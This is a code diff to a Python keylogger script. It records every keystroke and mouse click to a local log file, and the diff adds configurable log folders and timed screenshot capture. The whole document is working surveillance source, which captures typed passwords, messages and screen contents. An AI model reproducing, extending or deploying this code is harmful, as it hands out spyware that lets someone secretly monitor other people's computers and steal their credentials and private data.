@@ -1,19 +1,19 @@
-############################################## Customize these values to your liking.
+##################################################################### Customize these values to your liking.
+####################### General Settings
+
+# Either absolute or relative folder path name for the logs. Please use forward slashes "/". Leave "." for current directory.
+LOGS_PATHNAME = "."
+
+####################### Key Logging Settings
+
+# Whether to disable key logging.
+DISABLE_KEY_LOGGING = False
 
 # Keylog file name. This will be created in the same directory as this script.
 KEYLOG_FILENAME = "keylog.txt"
 
-# Whether to disable mouse logging.
-DISABLE_MOUSE_LOGGING = False
-
-# Whether to ignore multiple & same mouse clicks. Only the first click will be logged.
-IGNORE_SAME_MOUSE_CLICKS = False
-
-# Whether to disable escape sequences (CTRL + key) logging.
+# Whether to enable escape sequences logging (CTRL + key) logging.
 ESCAPE_SEQUENCES_LOGGING = True
-
-# Format for the mouse click string. This will be after the click string is converted.
-MOUSE_STRING_FORMAT = "[{btn}MB_{x},{y}]"
 
 # Conversion of command names to characters. Blank strings are ignored buttons.
 KEY_STRING_CONVERT = {
@@ -43,6 +43,17 @@ KEY_STRING_CONVERT = {
     "[F12]": "[EXIT]", # Exit key
 }
 
+####################### Mouse Logging Settings
+
+# Whether to disable mouse logging.
+DISABLE_MOUSE_LOGGING = False
+
+# Format for the mouse click string. This will be after the click string is converted.
+MOUSE_STRING_FORMAT = "[{btn}MB_{x},{y}]"
+
+# Whether to ignore multiple & same mouse clicks. Only the first click will be logged.
+IGNORE_SAME_MOUSE_CLICKS = True
+
 # Conversion of mouse button names to characters. Blank strings are ignored buttons.
 CLICK_STRING_CONVERT = {
     "LEFT": "L",
@@ -52,10 +63,30 @@ CLICK_STRING_CONVERT = {
     "X2": "5",
 }
 
-############################################## End
+####################### Screenshot Logging Settings
 
+# Whether to disable screenshot logging.
+DISABLE_SCREENSHOT_LOGGING = True
+
+# Screenshot file name format. "{index}" is an incrementing number.
+SCREENSHOT_FILENAME_FORMAT = "prtscr_{index}.png"
+
+# Interval between screenshots in seconds.
+SCREENSHOT_INTERVAL = 10
+
+# Whether to discard identical screenshots.
+DISCARD_IDENTICAL_SCREENSHOTS = True
+
+##################################################################### End
+
+
+import os
 from pynput import keyboard, mouse
-from os import _exit
+from time import sleep
+from threading import Timer as Interval
+from PIL.ImageGrab import grab as screenshot
+from PIL import ImageChops
+
 
 # Last click
 last_click = None
@@ -64,11 +95,11 @@ last_click = None
 def write_string(string):
     print(string, end="")
 
-    with open(KEYLOG_FILENAME, "a+") as f:
+    with open(os.path.join(LOGS_PATHNAME, KEYLOG_FILENAME), "a+") as f:
         f.write(string)
 
     if (string == "[EXIT]"):
-        raise _exit(0)
+        raise os._exit(0)
 
 # Writes a key press to the keylog file
 def write_key(key):
@@ -128,15 +159,53 @@ def write_click(x, y, button, pressed):
         write_string(letter)
 
 
-# Listens for key presses
-while True:
-    try:
-        if (DISABLE_MOUSE_LOGGING):
-            with keyboard.Listener(on_press=write_key) as key_list:
-                key_list.join()
-        else:
-            with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
-                key_list.join()
-                mouse_list.join()
-    except:
-        pass
+
+# Last screenshot
+last_screenshot = None
+
+# Returns the next filename in a sequence
+def next_filename_index(folder, str_format):
+    index = 0
+    while ( os.path.exists( os.path.join(folder, str_format.format(index=index)) ) ):
+        index += 1
+    return os.path.join(folder, str_format.format(index=index))
+
+# Returns whether two images are identical
+def images_are_identical(img1, img2):
+    return ImageChops.difference(img1, img2).getbbox() == None
+
+# Take a screenshot every 5 seconds
+def start_screenshot_timer():
+    prtscr = screenshot()
+
+    global last_screenshot
+    if (DISCARD_IDENTICAL_SCREENSHOTS == False or last_screenshot == None or images_are_identical(prtscr, last_screenshot) == False):
+        last_screenshot = prtscr
+        prtscr.save(next_filename_index(LOGS_PATHNAME, SCREENSHOT_FILENAME_FORMAT))
+        print("\nScreenshot taken!")
+    else:
+        print("\nIdentical screenshot, skipping...")
+
+    Interval(SCREENSHOT_INTERVAL, start_screenshot_timer).start()
+
+
+
+# Start logging
+try:
+    if (os.path.exists(LOGS_PATHNAME) == False):
+        os.mkdir(LOGS_PATHNAME)
+
+    if (DISABLE_KEY_LOGGING == False):
+        keyboard.Listener(on_press=write_key).start()
+
+    if (DISABLE_MOUSE_LOGGING == False):
+        mouse.Listener(on_click=write_click).start()
+
+    if (DISABLE_SCREENSHOT_LOGGING == False):
+        start_screenshot_timer()
+
+    # Keep the script running
+    while True:
+        sleep(3600)
+except:
+    pass
